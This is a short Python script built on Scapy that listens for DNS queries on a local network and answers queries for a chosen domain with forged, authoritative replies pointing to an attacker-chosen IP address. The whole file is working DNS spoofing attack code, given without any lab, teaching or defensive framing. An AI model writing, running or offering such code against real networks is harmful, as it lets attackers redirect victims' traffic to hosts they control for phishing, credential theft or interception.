from scapy.all import *

# Define the target IP address and the IP address of the DNS server
target_ip = "192.168.1.100"
dns_server_ip = "192.168.1.1"

# Define the domain you want to spoof and the fake IP address
spoofed_domain = "example.com"
fake_ip = "192.168.1.101"

# Function to handle DNS responses
def dns_spoof(pkt):
    # Check if the packet is a DNS request (UDP and port 53)
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
        # Check if the domain in the query matches the spoofed domain
        if spoofed_domain in pkt[DNSQR].qname.decode():
            print(f"Intercepted DNS request for {spoofed_domain}")
            # Create a DNS response packet
            spoofed_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                          UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=fake_ip))
            # Send the spoofed DNS response
            send(spoofed_pkt)
            print(f"Sent spoofed DNS response for {spoofed_domain} with IP {fake_ip}")

# Sniff DNS traffic and call the dns_spoof function on each packet
sniff(filter="udp port 53", prn=dns_spoof, store=0)
